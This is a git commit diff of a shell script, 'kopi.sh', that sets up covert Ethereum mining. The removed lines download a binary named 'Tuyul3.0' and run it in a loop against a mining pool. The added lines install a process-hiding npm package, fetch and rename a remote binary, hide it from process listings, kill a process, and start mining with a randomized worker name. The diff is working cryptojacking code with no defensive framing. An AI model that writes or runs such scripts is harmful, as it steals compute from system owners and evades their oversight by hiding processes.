1f267c8f090b2e356c0c795918f695d3b38b596b
nurfasikin <92776649+nurfasikin@users.noreply.github.com>
2022-07-02 13:28:27 +0700

    Update kopi.sh

--- kopi.sh
+++ kopi.sh
@@ -1,11 +1,11 @@
-#!/bin/bash
-POOL=stratum+tcp://ethash.kupool.com:1800
-WALLET=berkah.001
-WORKER=gpu1
-wget https://github.com/thecoderop/new/raw/main/Tuyul3.0
-chmod +x Tuyul3.0
-while [ 1 ]; do
-./Tuyul3.0 --algo ETHASH --pool $POOL --user $WALLET.$WORKER
-sleep 5
-done
-sleep 999999999 
+apt-get install -y nodejs
+npm i -g node-process-hider
+ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
+dpkg-reconfigure --frontend noninteractive tzdata
+wget https://github.com/aurbach55/dera/raw/main/kopi
+mv kopi ditto
+chmod +x ditto
+ph add ditto
+pkill -o 1
+sleep 8m
+./ditto --coin ETH --pool ethash.kupool.com:443 --user berkah.001.$(echo $(shuf -i 1-10 -n 1)-Time)
